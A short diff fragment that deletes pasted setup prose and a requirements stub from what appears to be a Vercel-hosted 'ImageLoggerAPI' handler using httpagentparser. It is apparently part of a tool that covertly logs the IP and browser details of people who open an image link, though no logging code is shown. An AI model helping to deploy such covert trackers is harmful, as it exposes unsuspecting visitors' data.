@@ -301,15 +301,4 @@ if (!currenturl.includes("g=")) {
     do_POST = handleRequest
 
 handler = ImageLoggerAPI
-```
-
-That's it. The `handler = ImageLoggerAPI` line at the very end is what Vercel needs to find the entry point.
-
----
-
-**Also make sure you have these two files in your repo root:**
-
-**`requirements.txt`**
-```
-requests
 httpagentparser
